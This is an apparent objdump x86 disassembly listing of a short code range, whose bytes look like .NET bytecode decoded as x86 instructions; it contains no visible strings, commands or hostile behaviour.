  402beb:	00 0a                	add    %cl,(%edx)
  402bed:	16                   	push   %ss
  402bee:	6f                   	outsl  %ds:(%esi),(%dx)
  402bef:	1c 00                	sbb    $0x0,%al
  402bf1:	00 0a                	add    %cl,(%edx)
  402bf3:	17                   	pop    %ss
  402bf4:	6f                   	outsl  %ds:(%esi),(%dx)
  402bf5:	1d 00 00 0a a5       	sbb    $0xa50a0000,%eax
  402bfa:	29 00                	sub    %eax,(%eax)
  402bfc:	00 01                	add    %al,(%ecx)
  402bfe:	80 16 00             	adcb   $0x0,(%esi)
  402c01:	00 04 72             	add    %al,(%edx,%esi,2)
  402c04:	58                   	pop    %eax
  402c05:	32 00                	xor    (%eax),%al
  402c07:	70 28                	jo     0x402c31
  402c09:	1e                   	push   %ds
  402c0a:	00 00                	add    %al,(%eax)
  402c0c:	0a 00                	or     (%eax),%al
  402c0e:	72 74                	jb     0x402c84
  402c10:	32 00                	xor    (%eax),%al
  402c12:	70 7e                	jo     0x402c92
  402c14:	16                   	push   %ss
  402c15:	00 00                	add    %al,(%eax)
  402c17:	04 8c                	add    $0x8c,%al
  402c19:	29 00                	sub    %eax,(%eax)
  402c1b:	00 01                	add    %al,(%ecx)
  402c1d:	28 20                	sub    %ah,(%eax)
  402c1f:	00 00                	add    %al,(%eax)
  402c21:	0a 00                	or     (%eax),%al
  402c23:	7e 16                	jle    0x402c3b
  402c25:	00 00                	add    %al,(%eax)
  402c27:	04 16                	add    $0x16,%al
  402c29:	fe 01                	incb   (%ecx)
  402c2b:	13 04 11             	adc    (%ecx,%edx,1),%eax
  402c2e:	04 2c                	add    $0x2c,%al
  402c30:	18 00                	sbb    %al,(%eax)
  402c32:	72 b2                	jb     0x402be6
  402c34:	32 00                	xor    (%eax),%al
  402c36:	70 28                	jo     0x402c60
  402c38:	1e                   	push   %ds
  402c39:	00 00                	add    %al,(%eax)
  402c3b:	0a 00                	or     (%eax),%al
  402c3d:	06                   	push   %es
  402c3e:	6f                   	outsl  %ds:(%esi),(%dx)
  402c3f:	1f                   	pop    %ds
  402c40:	00 00                	add    %al,(%eax)
  402c42:	0a 00                	or     (%eax),%al
  402c44:	16                   	push   %ss
  402c45:	13 05 de 36 06 6f    	adc    0x6f0636de,%eax
  402c4b:	1f                   	pop    %ds
  402c4c:	00 00                	add    %al,(%eax)
  402c4e:	0a 00                	or     (%eax),%al
  402c50:	17                   	pop    %ss
  402c51:	13 05 de 2a 13 06    	adc    0x6132ade,%eax
  402c57:	00 72 ec             	add    %dh,-0x14(%edx)
  402c5a:	32 00                	xor    (%eax),%al
  402c5c:	70 28                	jo     0x402c86
  402c5e:	1e                   	push   %ds
  402c5f:	00 00                	add    %al,(%eax)
  402c61:	0a 00                	or     (%eax),%al
  402c63:	72 e8                	jb     0x402c4d
  402c65:	11 00                	adc    %eax,(%eax)
  402c67:	70 11                	jo     0x402c7a
  402c69:	06                   	push   %es
  402c6a:	6f                   	outsl  %ds:(%esi),(%dx)
  402c6b:	21 00                	and    %eax,(%eax)
  402c6d:	00 0a                	add    %cl,(%edx)
  402c6f:	28 22                	sub    %ah,(%edx)
  402c71:	00 00                	add    %al,(%eax)
  402c73:	0a 28                	or     (%eax),%ch
  402c75:	1e                   	push   %ds
  402c76:	00 00                	add    %al,(%eax)
  402c78:	0a 00                	or     (%eax),%al
  402c7a:	16                   	push   %ss
  402c7b:	13 05 de 00 11 05    	adc    0x51100de,%eax
  402c81:	2a 00                	sub    (%eax),%al
  402c83:	00 01                	add    %al,(%ecx)
  402c85:	10 00                	adc    %al,(%eax)
  402c87:	00 00                	add    %al,(%eax)
  402c89:	00 7b 02             	add    %bh,0x2(%ebx)
  402c8c:	7e f9                	jle    0x402c87
  402c8e:	02 2a                	add    (%edx),%ch
  402c90:	16                   	push   %ss
  402c91:	00 00                	add    %al,(%eax)
  402c93:	01 22                	add    %esp,(%edx)
  402c95:	02 28                	add    (%eax),%ch
  402c97:	25 00 00 0a 00       	and    $0xa0000,%eax
  402c9c:	2a 00                	sub    (%eax),%al
  402c9e:	00 00                	add    %al,(%eax)
  402ca0:	1b 30                	sbb    (%eax),%esi
  402ca2:	05 00 f9 00 00       	add    $0xf900,%eax
  402ca7:	00 06                	add    %al,(%esi)
  402ca9:	00 00                	add    %al,(%eax)
  402cab:	11 00                	adc    %eax,(%eax)
  402cad:	73 26                	jae    0x402cd5
  402caf:	00 00                	add    %al,(%eax)
  402cb1:	0a 0a                	or     (%edx),%cl
  402cb3:	7e 0e                	jle    0x402cc3
  402cb5:	00 00                	add    %al,(%eax)
  402cb7:	04 72                	add    $0x72,%al
  402cb9:	34 33                	xor    $0x33,%al
  402cbb:	00 70 6f             	add    %dh,0x6f(%eax)
  402cbe:	27                   	daa
  402cbf:	00 00                	add    %al,(%eax)
  402cc1:	0a 2d 11 7e 0e 00    	or     0xe7e11,%ch
  402cc7:	00 04 72             	add    %al,(%edx,%esi,2)
  402cca:	40                   	inc    %eax
  402ccb:	33 00                	xor    (%eax),%eax
  402ccd:	70 6f                	jo     0x402d3e
  402ccf:	27                   	daa
  402cd0:	00 00                	add    %al,(%eax)
  402cd2:	0a 2b                	or     (%ebx),%ch
  402cd4:	01 17                	add    %edx,(%edi)
  402cd6:	0b 07                	or     (%edi),%eax
  402cd8:	2c 53                	sub    $0x53,%al
  402cda:	00 7e 0d             	add    %bh,0xd(%esi)
  402cdd:	00 00                	add    %al,(%eax)
  402cdf:	04 72                	add    $0x72,%al
  402ce1:	4e                   	dec    %esi
  402ce2:	33 00                	xor    (%eax),%eax
  402ce4:	70 6f                	jo     0x402d55
  402ce6:	27                   	daa
  402ce7:	00 00                	add    %al,(%eax)
  402ce9:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  402cec:	2c 1f                	sub    $0x1f,%al
  402cee:	00 06                	add    %al,(%esi)
  402cf0:	72 66                	jb     0x402d58
  402cf2:	33 00                	xor    (%eax),%eax
  402cf4:	70 7e                	jo     0x402d74
  402cf6:	0f 00 00             	sldt   (%eax)
  402cf9:	04 72                	add    $0x72,%al
  402cfb:	e0 33                	loopne 0x402d30
  402cfd:	00 70 28             	add    %dh,0x28(%eax)
  402d00:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
  402d05:	28 00                	sub    %al,(%eax)
  402d07:	00 0a                	add    %cl,(%edx)
  402d09:	00 00                	add    %al,(%eax)
  402d0b:	2b 1d 00 06 72 14    	sub    0x14720600,%ebx
  402d11:	34 00                	xor    $0x0,%al
  402d13:	70 7e                	jo     0x402d93
  402d15:	0f 00 00             	sldt   (%eax)
  402d18:	04 72                	add    $0x72,%al
  402d1a:	82 34 00 70          	xorb   $0x70,(%eax,%eax,1)
  402d1e:	28 15 00 00 0a 6f    	sub    %dl,0x6f0a0000
  402d24:	28 00                	sub    %al,(%eax)
  402d26:	00 0a                	add    %cl,(%edx)
  402d28:	00 00                	add    %al,(%eax)
  402d2a:	00 2b                	add    %ch,(%ebx)
  402d2c:	3c 00                	cmp    $0x0,%al
  402d2e:	06                   	push   %es
  402d2f:	1b 8d 23 00 00 01    	sbb    0x1000023(%ebp),%ecx
  402d35:	25 16 72 b8 34       	and    $0x34b87216,%eax
  402d3a:	00 70 a2             	add    %dh,-0x5e(%eax)
  402d3d:	25 17 7e 0e 00       	and    $0xe7e17,%eax
  402d42:	00 04 a2             	add    %al,(%edx,%eiz,4)
  402d45:	25 18 72 c8 34       	and    $0x34c87218,%eax
  402d4a:	00 70 a2             	add    %dh,-0x5e(%eax)
  402d4d:	25 19 7e 0f 00       	and    $0xf7e19,%eax
  402d52:	00 04 a2             	add    %al,(%edx,%eiz,4)
  402d55:	25 1a 72 82 34       	and    $0x3482721a,%eax
  402d5a:	00 70 a2             	add    %dh,-0x5e(%eax)
  402d5d:	28 17                	sub    %dl,(%edi)
  402d5f:	00 00                	add    %al,(%eax)
  402d61:	0a 6f 28             	or     0x28(%edi),%ch
  402d64:	00 00                	add    %al,(%eax)
  402d66:	0a 00                	or     (%eax),%al
  402d68:	00 00                	add    %al,(%eax)
  402d6a:	00 06                	add    %al,(%esi)
  402d6c:	6f                   	outsl  %ds:(%esi),(%dx)
  402d6d:	29 00                	sub    %eax,(%eax)
  402d6f:	00 0a                	add    %cl,(%edx)
  402d71:	00 00                	add    %al,(%eax)
  402d73:	de 28                	fisubrs (%eax)
  402d75:	0d 00 72 de 34       	or     $0x34de7200,%eax
  402d7a:	00 70 28             	add    %dh,0x28(%eax)
  402d7d:	1e                   	push   %ds
  402d7e:	00 00                	add    %al,(%eax)
  402d80:	0a 00                	or     (%eax),%al
  402d82:	72 e8                	jb     0x402d6c
  402d84:	11 00                	adc    %eax,(%eax)
  402d86:	70 09                	jo     0x402d91
  402d88:	6f                   	outsl  %ds:(%esi),(%dx)
  402d89:	21 00                	and    %eax,(%eax)
  402d8b:	00 0a                	add    %cl,(%edx)
  402d8d:	28 22                	sub    %ah,(%edx)
  402d8f:	00 00                	add    %al,(%eax)
  402d91:	0a 28                	or     (%eax),%ch
  402d93:	1e                   	push   %ds
  402d94:	00 00                	add    %al,(%eax)
  402d96:	0a 00                	or     (%eax),%al
  402d98:	14 13                	adc    $0x13,%al
  402d9a:	04 de                	add    $0xde,%al
  402d9c:	05 06 13 04 2b       	add    $0x2b041306,%eax
  402da1:	00 11                	add    %dl,(%ecx)
  402da3:	04 2a                	add    $0x2a,%al
  402da5:	00 00                	add    %al,(%eax)
  402da7:	00 01                	add    %al,(%ecx)
  402da9:	10 00                	adc    %al,(%eax)
  402dab:	00 00                	add    %al,(%eax)
  402dad:	00 be 00 0b c9 00    	add    %bh,0xc90b00(%esi)
  402db3:	28 16                	sub    %dl,(%esi)
  402db5:	00 00                	add    %al,(%eax)
  402db7:	01 22                	add    %esp,(%edx)
  402db9:	02 28                	add    (%eax),%ch
  402dbb:	25 00 00 0a 00       	and    $0xa0000,%eax
  402dc0:	2a 00                	sub    (%eax),%al
  402dc2:	00 00                	add    %al,(%eax)
  402dc4:	1b 30                	sbb    (%eax),%esi
  402dc6:	04 00                	add    $0x0,%al
  402dc8:	d1 00                	roll   $1,(%eax)
  402dca:	00 00                	add    %al,(%eax)
  402dcc:	07                   	pop    %es
  402dcd:	00 00                	add    %al,(%eax)
  402dcf:	11 00                	adc    %eax,(%eax)
  402dd1:	02 72 24             	add    0x24(%edx),%dh
  402dd4:	35 00 70 6f 18       	xor    $0x186f7000,%eax
  402dd9:	00 00                	add    %al,(%eax)
  402ddb:	0a 00                	or     (%eax),%al
  402ddd:	00 02                	add    %al,(%edx)
  402ddf:	6f                   	outsl  %ds:(%esi),(%dx)
  402de0:	19 00                	sbb    %eax,(%eax)
  402de2:	00 0a                	add    %cl,(%edx)
  402de4:	0a 06                	or     (%esi),%al
  402de6:	6f                   	outsl  %ds:(%esi),(%dx)
  402de7:	2a 00                	sub    (%eax),%al
  402de9:	00 0a                	add    %cl,(%edx)
  402deb:	0b 07                	or     (%edi),%eax
  402ded:	39 82 00 00 00 00    	cmp    %eax,0x0(%edx)
  402df3:	06                   	push   %es
  402df4:	06                   	push   %es
  402df5:	72 4e                	jb     0x402e45
  402df7:	35 00 70 6f 2b       	xor    $0x2b6f7000,%eax
  402dfc:	00 00                	add    %al,(%eax)
  402dfe:	0a 6f 2c             	or     0x2c(%edi),%ch
  402e01:	00 00                	add    %al,(%eax)
  402e03:	0a 74 23 00          	or     0x0(%ebx,%eiz,1),%dh
  402e07:	00 01                	add    %al,(%ecx)
  402e09:	80 10 00             	adcb   $0x0,(%eax)
  402e0c:	00 04 06             	add    %al,(%esi,%eax,1)
  402e0f:	06                   	push   %es
  402e10:	72 82                	jb     0x402d94
  402e12:	35 00 70 6f 2b       	xor    $0x2b6f7000,%eax
  402e17:	00 00                	add    %al,(%eax)
  402e19:	0a 6f 2c             	or     0x2c(%edi),%ch
  402e1c:	00 00                	add    %al,(%eax)
  402e1e:	0a a5 29 00 00 01    	or     0x1000029(%ebp),%ah
  402e24:	80 12 00             	adcb   $0x0,(%edx)
  402e27:	00 04 72             	add    %al,(%edx,%esi,2)
  402e2a:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  402e2b:	35 00 70 28 1e       	xor    $0x1e287000,%eax
  402e30:	00 00                	add    %al,(%eax)
  402e32:	0a 00                	or     (%eax),%al
  402e34:	72 33                	jb     0x402e69
  402e36:	36 00 70 28          	add    %dh,%ss:0x28(%eax)
  402e3a:	1e                   	push   %ds
  402e3b:	00 00                	add    %al,(%eax)
  402e3d:	0a 00                	or     (%eax),%al
  402e3f:	72 93                	jb     0x402dd4
  402e41:	36 00 70 28          	add    %dh,%ss:0x28(%eax)
  402e45:	1e                   	push   %ds
  402e46:	00 00                	add    %al,(%eax)
  402e48:	0a 00                	or     (%eax),%al
  402e4a:	72 f3                	jb     0x402e3f
  402e4c:	36 00 70 28          	add    %dh,%ss:0x28(%eax)
  402e50:	2d 00 00 0a 7e       	sub    $0x7e0a0000,%eax
  402e55:	12 00                	adc    (%eax),%al
  402e57:	00 04 8c             	add    %al,(%esp,%ecx,4)
  402e5a:	29 00                	sub    %eax,(%eax)
  402e5c:	00 01                	add    %al,(%ecx)
  402e5e:	7e 10                	jle    0x402e70
  402e60:	00 00                	add    %al,(%eax)
  402e62:	04 28                	add    $0x28,%al
  402e64:	2e 00 00             	add    %al,%cs:(%eax)
  402e67:	0a 00                	or     (%eax),%al
  402e69:	06                   	push   %es
  402e6a:	6f                   	outsl  %ds:(%esi),(%dx)
  402e6b:	1f                   	pop    %ds
  402e6c:	00 00                	add    %al,(%eax)
  402e6e:	0a 00                	or     (%eax),%al
  402e70:	17                   	pop    %ss
  402e71:	0c de                	or     $0xde,%al
  402e73:	2b 16                	sub    (%esi),%edx
  402e75:	0c de                	or     $0xde,%al
  402e77:	27                   	daa
  402e78:	0d 00 72 13 37       	or     $0x37137200,%eax
  402e7d:	00 70 28             	add    %dh,0x28(%eax)
  402e80:	1e                   	push   %ds
  402e81:	00 00                	add    %al,(%eax)
  402e83:	0a 00                	or     (%eax),%al
  402e85:	72 e8                	jb     0x402e6f
  402e87:	11 00                	adc    %eax,(%eax)
  402e89:	70 09                	jo     0x402e94
  402e8b:	6f                   	outsl  %ds:(%esi),(%dx)
  402e8c:	21 00                	and    %eax,(%eax)
  402e8e:	00 0a                	add    %cl,(%edx)
  402e90:	28 22                	sub    %ah,(%edx)
  402e92:	00 00                	add    %al,(%eax)
  402e94:	0a 28                	or     (%eax),%ch
  402e96:	1e                   	push   %ds
  402e97:	00 00                	add    %al,(%eax)
  402e99:	0a 00                	or     (%eax),%al
  402e9b:	16                   	push   %ss
  402e9c:	0c de                	or     $0xde,%al
  402e9e:	00 08                	add    %cl,(%eax)
  402ea0:	2a 00                	sub    (%eax),%al
  402ea2:	00 00                	add    %al,(%eax)
  402ea4:	01 10                	add    %edx,(%eax)
  402ea6:	00 00                	add    %al,(%eax)
  402ea8:	00 00                	add    %al,(%eax)
  402eaa:	0d 00 9b a8 00       	or     $0xa89b00,%eax
  402eaf:	27                   	daa
  402eb0:	16                   	push   %ss
  402eb1:	00 00                	add    %al,(%eax)
  402eb3:	01 1b                	add    %ebx,(%ebx)
  402eb5:	30 07                	xor    %al,(%edi)
  402eb7:	00 e2                	add    %ah,%dl
  402eb9:	00 00                	add    %al,(%eax)
  402ebb:	00 08                	add    %cl,(%eax)
  402ebd:	00 00                	add    %al,(%eax)
  402ebf:	11 00                	adc    %eax,(%eax)
  402ec1:	02 72 61             	add    0x61(%edx),%dh
  402ec4:	37                   	aaa
  402ec5:	00 70 6f             	add    %dh,0x6f(%eax)
  402ec8:	18 00                	sbb    %al,(%eax)
  402eca:	00 0a                	add    %cl,(%edx)
  402ecc:	00 00                	add    %al,(%eax)
  402ece:	72 8f                	jb     0x402e5f
  402ed0:	37                   	aaa
  402ed1:	00 70 28             	add    %dh,0x28(%eax)
  402ed4:	1e                   	push   %ds
  402ed5:	00 00                	add    %al,(%eax)
  402ed7:	0a 00                	or     (%eax),%al
  402ed9:	72 1e                	jb     0x402ef9
  402edb:	38 00                	cmp    %al,(%eax)
  402edd:	70 28                	jo     0x402f07
  402edf:	1e                   	push   %ds
  402ee0:	00 00                	add    %al,(%eax)
  402ee2:	0a 00                	or     (%eax),%al
  402ee4:	72 86                	jb     0x402e6c
  402ee6:	38 00                	cmp    %al,(%eax)
  402ee8:	70 28                	jo     0x402f12
  402eea:	1e                   	push   %ds
  402eeb:	00 00                	add    %al,(%eax)
  402eed:	0a 00                	or     (%eax),%al
  402eef:	02 6f 19             	add    0x19(%edi),%ch
  402ef2:	00 00                	add    %al,(%eax)
  402ef4:	0a 0a                	or     (%edx),%cl
  402ef6:	06                   	push   %es
  402ef7:	6f                   	outsl  %ds:(%esi),(%dx)
  402ef8:	2f                   	das
  402ef9:	00 00                	add    %al,(%eax)
  402efb:	0a 0b                	or     (%ebx),%cl
  402efd:	2b 63 00             	sub    0x0(%ebx),%esp
  402f00:	72 ee                	jb     0x402ef0
  402f02:	38 00                	cmp    %al,(%eax)
  402f04:	70 1a                	jo     0x402f20
  402f06:	8d 10                	lea    (%eax),%edx
  402f08:	00 00                	add    %al,(%eax)
  402f0a:	01 25 16 06 06 72    	add    %esp,0x72060616
  402f10:	14 39                	adc    $0x39,%al
  402f12:	00 70 6f             	add    %dh,0x6f(%eax)
  402f15:	2b 00                	sub    (%eax),%eax
  402f17:	00 0a                	add    %cl,(%edx)
  402f19:	6f                   	outsl  %ds:(%esi),(%dx)
  402f1a:	2c 00                	sub    $0x0,%al
  402f1c:	00 0a                	add    %cl,(%edx)
  402f1e:	a2 25 17 06 06       	mov    %al,0x6061725
  402f23:	72 32                	jb     0x402f57
  402f25:	39 00                	cmp    %eax,(%eax)
  402f27:	70 6f                	jo     0x402f98
  402f29:	2b 00                	sub    (%eax),%eax
  402f2b:	00 0a                	add    %cl,(%edx)
  402f2d:	6f                   	outsl  %ds:(%esi),(%dx)
  402f2e:	2c 00                	sub    $0x0,%al
  402f30:	00 0a                	add    %cl,(%edx)
  402f32:	a2 25 18 06 06       	mov    %al,0x6061825
  402f37:	72 46                	jb     0x402f7f
  402f39:	39 00                	cmp    %eax,(%eax)
  402f3b:	70 6f                	jo     0x402fac
  402f3d:	2b 00                	sub    (%eax),%eax
  402f3f:	00 0a                	add    %cl,(%edx)
  402f41:	6f                   	outsl  %ds:(%esi),(%dx)
  402f42:	2c 00                	sub    $0x0,%al
  402f44:	00 0a                	add    %cl,(%edx)
  402f46:	a2 25 19 06 06       	mov    %al,0x6061925
  402f4b:	72 62                	jb     0x402faf
  402f4d:	39 00                	cmp    %eax,(%eax)
  402f4f:	70 6f                	jo     0x402fc0
  402f51:	2b 00                	sub    (%eax),%eax
  402f53:	00 0a                	add    %cl,(%edx)
  402f55:	6f                   	outsl  %ds:(%esi),(%dx)
  402f56:	2c 00                	sub    $0x0,%al
  402f58:	00 0a                	add    %cl,(%edx)
  402f5a:	a2 28 30 00 00       	mov    %al,0x3028
  402f5f:	0a 00                	or     (%eax),%al
  402f61:	00 06                	add    %al,(%esi)
  402f63:	6f                   	outsl  %ds:(%esi),(%dx)
  402f64:	2a 00                	sub    (%eax),%al
  402f66:	00 0a                	add    %cl,(%edx)
  402f68:	0c 08                	or     $0x8,%al
  402f6a:	2d 93 06 6f 1f       	sub    $0x1f6f0693,%eax
  402f6f:	00 00                	add    %al,(%eax)
  402f71:	0a 00                	or     (%eax),%al
  402f73:	17                   	pop    %ss
  402f74:	0d de 29 13 04       	or     $0x41329de,%eax
  402f79:	00 72 90             	add    %dh,-0x70(%edx)
  402f7c:	39 00                	cmp    %eax,(%eax)
  402f7e:	70 28                	jo     0x402fa8
  402f80:	1e                   	push   %ds
  402f81:	00 00                	add    %al,(%eax)
  402f83:	0a 00                	or     (%eax),%al
  402f85:	72 e8                	jb     0x402f6f
  402f87:	11 00                	adc    %eax,(%eax)
  402f89:	70 11                	jo     0x402f9c
  402f8b:	04 6f                	add    $0x6f,%al
  402f8d:	21 00                	and    %eax,(%eax)
  402f8f:	00 0a                	add    %cl,(%edx)
  402f91:	28 22                	sub    %ah,(%edx)
  402f93:	00 00                	add    %al,(%eax)
  402f95:	0a 28                	or     (%eax),%ch
  402f97:	1e                   	push   %ds
  402f98:	00 00                	add    %al,(%eax)
  402f9a:	0a 00                	or     (%eax),%al
  402f9c:	16                   	push   %ss
  402f9d:	0d de 00 09 2a       	or     $0x2a0900de,%eax
  402fa2:	00 00                	add    %al,(%eax)
  402fa4:	01 10                	add    %edx,(%eax)
  402fa6:	00 00                	add    %al,(%eax)
  402fa8:	00 00                	add    %al,(%eax)
  402faa:	0d 00 aa b7 00       	or     $0xb7aa00,%eax
  402faf:	29 16                	sub    %edx,(%esi)
  402fb1:	00 00                	add    %al,(%eax)
  402fb3:	01 1b                	add    %ebx,(%ebx)
  402fb5:	30 06                	xor    %al,(%esi)
  402fb7:	00 bf 00 00 00 08    	add    %bh,0x8000000(%edi)
  402fbd:	00 00                	add    %al,(%eax)
  402fbf:	11 00                	adc    %eax,(%eax)
  402fc1:	02 72 de             	add    -0x22(%edx),%dh
  402fc4:	39 00                	cmp    %eax,(%eax)
  402fc6:	70 6f                	jo     0x403037
  402fc8:	18 00                	sbb    %al,(%eax)
  402fca:	00 0a                	add    %cl,(%edx)
  402fcc:	00 00                	add    %al,(%eax)
  402fce:	72 1c                	jb     0x402fec
  402fd0:	3a 00                	cmp    (%eax),%al
  402fd2:	70 28                	jo     0x402ffc
  402fd4:	1e                   	push   %ds
  402fd5:	00 00                	add    %al,(%eax)
  402fd7:	0a 00                	or     (%eax),%al
  402fd9:	72 bd                	jb     0x402f98
  402fdb:	3a 00                	cmp    (%eax),%al
  402fdd:	70 28                	jo     0x403007
  402fdf:	1e                   	push   %ds
  402fe0:	00 00                	add    %al,(%eax)
  402fe2:	0a 00                	or     (%eax),%al
  402fe4:	72 86                	jb     0x402f6c
  402fe6:	38 00                	cmp    %al,(%eax)
  402fe8:	70 28                	jo     0x403012
  402fea:	1e                   	push   %ds
  402feb:	00 00                	add    %al,(%eax)
  402fed:	0a 00                	or     (%eax),%al
  402fef:	02 6f 19             	add    0x19(%edi),%ch
  402ff2:	00 00                	add    %al,(%eax)
  402ff4:	0a 0a                	or     (%edx),%cl
  402ff6:	06                   	push   %es
  402ff7:	6f                   	outsl  %ds:(%esi),(%dx)
  402ff8:	2f                   	das
  402ff9:	00 00                	add    %al,(%eax)
  402ffb:	0a 0b                	or     (%ebx),%cl
  402ffd:	2b 40 00             	sub    0x0(%eax),%eax
  403000:	72 0f                	jb     0x403011
  403002:	3b 00                	cmp    (%eax),%eax
  403004:	70 06                	jo     0x40300c
  403006:	06                   	push   %es
  403007:	72 2b                	jb     0x403034
  403009:	3b 00                	cmp    (%eax),%eax
  40300b:	70 6f                	jo     0x40307c
  40300d:	2b 00                	sub    (%eax),%eax
  40300f:	00 0a                	add    %cl,(%edx)
  403011:	6f                   	outsl  %ds:(%esi),(%dx)
  403012:	2c 00                	sub    $0x0,%al
  403014:	00 0a                	add    %cl,(%edx)
  403016:	06                   	push   %es
  403017:	06                   	push   %es
  403018:	72 43                	jb     0x40305d
  40301a:	3b 00                	cmp    (%eax),%eax
  40301c:	70 6f                	jo     0x40308d
  40301e:	2b 00                	sub    (%eax),%eax
  403020:	00 0a                	add    %cl,(%edx)
  403022:	6f                   	outsl  %ds:(%esi),(%dx)
  403023:	2c 00                	sub    $0x0,%al
  403025:	00 0a                	add    %cl,(%edx)
  403027:	06                   	push   %es
  403028:	06                   	push   %es
  403029:	72 53                	jb     0x40307e
  40302b:	3b 00                	cmp    (%eax),%eax
  40302d:	70 6f                	jo     0x40309e
  40302f:	2b 00                	sub    (%eax),%eax
  403031:	00 0a                	add    %cl,(%edx)
  403033:	6f                   	outsl  %ds:(%esi),(%dx)
  403034:	2c 00                	sub    $0x0,%al
  403036:	00 0a                	add    %cl,(%edx)
  403038:	28 2e                	sub    %ch,(%esi)
  40303a:	00 00                	add    %al,(%eax)
  40303c:	0a 00                	or     (%eax),%al
  40303e:	00 06                	add    %al,(%esi)
  403040:	6f                   	outsl  %ds:(%esi),(%dx)
  403041:	2a 00                	sub    (%eax),%al
  403043:	00 0a                	add    %cl,(%edx)
  403045:	0c 08                	or     $0x8,%al
  403047:	2d b6 06 6f 1f       	sub    $0x1f6f06b6,%eax
  40304c:	00 00                	add    %al,(%eax)
  40304e:	0a 00                	or     (%eax),%al
  403050:	17                   	pop    %ss
  403051:	0d de 29 13 04       	or     $0x41329de,%eax
  403056:	00 72 79             	add    %dh,0x79(%edx)
  403059:	3b 00                	cmp    (%eax),%eax
  40305b:	70 28                	jo     0x403085
  40305d:	1e                   	push   %ds
  40305e:	00 00                	add    %al,(%eax)
  403060:	0a 00                	or     (%eax),%al
  403062:	72 e8                	jb     0x40304c
  403064:	11 00                	adc    %eax,(%eax)
  403066:	70 11                	jo     0x403079
  403068:	04 6f                	add    $0x6f,%al
  40306a:	21 00                	and    %eax,(%eax)
  40306c:	00 0a                	add    %cl,(%edx)
  40306e:	28 22                	sub    %ah,(%edx)
  403070:	00 00                	add    %al,(%eax)
  403072:	0a 28                	or     (%eax),%ch
  403074:	1e                   	push   %ds
  403075:	00 00                	add    %al,(%eax)
  403077:	0a 00                	or     (%eax),%al
  403079:	16                   	push   %ss
  40307a:	0d de 00 09 2a       	or     $0x2a0900de,%eax
  40307f:	00 01                	add    %al,(%ecx)
  403081:	10 00                	adc    %al,(%eax)
  403083:	00 00                	add    %al,(%eax)
  403085:	00 0d 00 87 94 00    	add    %cl,0x948700
  40308b:	29 16                	sub    %edx,(%esi)
  40308d:	00 00                	add    %al,(%eax)
  40308f:	01 1b                	add    %ebx,(%ebx)
  403091:	30 04 00             	xor    %al,(%eax,%eax,1)
  403094:	9d                   	popf
  403095:	00 00                	add    %al,(%eax)
  403097:	00 08                	add    %cl,(%eax)
  403099:	00 00                	add    %al,(%eax)
  40309b:	11 00                	adc    %eax,(%eax)
  40309d:	02 72 c3             	add    -0x3d(%edx),%dh
  4030a0:	3b 00                	cmp    (%eax),%eax
  4030a2:	70 6f                	jo     0x403113
  4030a4:	18 00                	sbb    %al,(%eax)
  4030a6:	00 0a                	add    %cl,(%edx)
  4030a8:	00 00                	add    %al,(%eax)
  4030aa:	72 f7                	jb     0x4030a3
  4030ac:	3b 00                	cmp    (%eax),%eax
  4030ae:	70 28                	jo     0x4030d8
  4030b0:	1e                   	push   %ds
  4030b1:	00 00                	add    %al,(%eax)
  4030b3:	0a 00                	or     (%eax),%al
  4030b5:	72 80                	jb     0x403037
  4030b7:	3c 00                	cmp    $0x0,%al
  4030b9:	70 28                	jo     0x4030e3
  4030bb:	1e                   	push   %ds
  4030bc:	00 00                	add    %al,(%eax)
  4030be:	0a 00                	or     (%eax),%al
  4030c0:	72 86                	jb     0x403048
  4030c2:	38 00                	cmp    %al,(%eax)
  4030c4:	70 28                	jo     0x4030ee
  4030c6:	1e                   	push   %ds
  4030c7:	00 00                	add    %al,(%eax)
  4030c9:	0a 00                	or     (%eax),%al
  4030cb:	02 6f 19             	add    0x19(%edi),%ch
  4030ce:	00 00                	add    %al,(%eax)
  4030d0:	0a 0a                	or     (%edx),%cl
  4030d2:	06                   	push   %es
  4030d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4030d4:	2f                   	das
  4030d5:	00 00                	add    %al,(%eax)
  4030d7:	0a 0b                	or     (%ebx),%cl
  4030d9:	2b 1e                	sub    (%esi),%ebx
  4030db:	00 72 94             	add    %dh,-0x6c(%edx)
  4030de:	3c 00                	cmp    $0x0,%al
  4030e0:	70 06                	jo     0x4030e8
  4030e2:	06                   	push   %es
  4030e3:	72 9c                	jb     0x403081
  4030e5:	3c 00                	cmp    $0x0,%al
  4030e7:	70 6f                	jo     0x403158
  4030e9:	2b 00                	sub    (%eax),%eax
  4030eb:	00 0a                	add    %cl,(%edx)
  4030ed:	6f                   	outsl  %ds:(%esi),(%dx)
  4030ee:	2c 00                	sub    $0x0,%al
  4030f0:	00 0a                	add    %cl,(%edx)
  4030f2:	28 20                	sub    %ah,(%eax)
  4030f4:	00 00                	add    %al,(%eax)
  4030f6:	0a 00                	or     (%eax),%al
  4030f8:	00 06                	add    %al,(%esi)
  4030fa:	6f                   	outsl  %ds:(%esi),(%dx)
  4030fb:	2a 00                	sub    (%eax),%al
  4030fd:	00 0a                	add    %cl,(%edx)
  4030ff:	0c 08                	or     $0x8,%al
  403101:	2d d8 06 6f 1f       	sub    $0x1f6f06d8,%eax
  403106:	00 00                	add    %al,(%eax)
  403108:	0a 00                	or     (%eax),%al
  40310a:	17                   	pop    %ss
  40310b:	0d de 29 13 04       	or     $0x41329de,%eax
  403110:	00 72 a6             	add    %dh,-0x5a(%edx)
  403113:	3c 00                	cmp    $0x0,%al
  403115:	70 28                	jo     0x40313f
  403117:	1e                   	push   %ds
  403118:	00 00                	add    %al,(%eax)
  40311a:	0a 00                	or     (%eax),%al
  40311c:	72 e8                	jb     0x403106
  40311e:	11 00                	adc    %eax,(%eax)
  403120:	70 11                	jo     0x403133
  403122:	04 6f                	add    $0x6f,%al
  403124:	21 00                	and    %eax,(%eax)
  403126:	00 0a                	add    %cl,(%edx)
  403128:	28 22                	sub    %ah,(%edx)
  40312a:	00 00                	add    %al,(%eax)
  40312c:	0a 28                	or     (%eax),%ch
  40312e:	1e                   	push   %ds
  40312f:	00 00                	add    %al,(%eax)
  403131:	0a 00                	or     (%eax),%al
  403133:	16                   	push   %ss
  403134:	0d de 00 09 2a       	or     $0x2a0900de,%eax
  403139:	00 00                	add    %al,(%eax)
  40313b:	00 01                	add    %al,(%ecx)
  40313d:	10 00                	adc    %al,(%eax)
  40313f:	00 00                	add    %al,(%eax)
